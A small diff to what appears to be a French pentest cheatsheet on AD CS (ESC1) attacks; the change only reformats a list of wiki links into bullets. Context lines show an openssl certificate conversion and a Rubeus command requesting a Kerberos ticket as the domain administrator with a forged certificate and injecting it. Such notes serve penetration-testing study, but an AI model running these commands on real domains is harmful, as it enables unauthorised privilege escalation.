@@ -44,4 +44,8 @@ C:\AD\Tools\openssl\openssl.exe pkcs12 -in esc1.pem -keyex -CSP "Microsoft Enhan
 Rubeus.exe asktgt /user:administrator /certificate:esc1-DA.pfx /password:<PW> /ptt
 ```
 
-**Link** — [[Synthèse - AD CS]] · [[Cheatsheet - Trusts et forêts]] · [[Cheatsheet - Tickets Kerberos]] · [[Attaques AD - MOC]]
+**Link**
+- [[Synthèse - AD CS]]
+- [[Cheatsheet - Trusts et forêts]]
+- [[Cheatsheet - Tickets Kerberos]]
+- [[Attaques AD - MOC]]
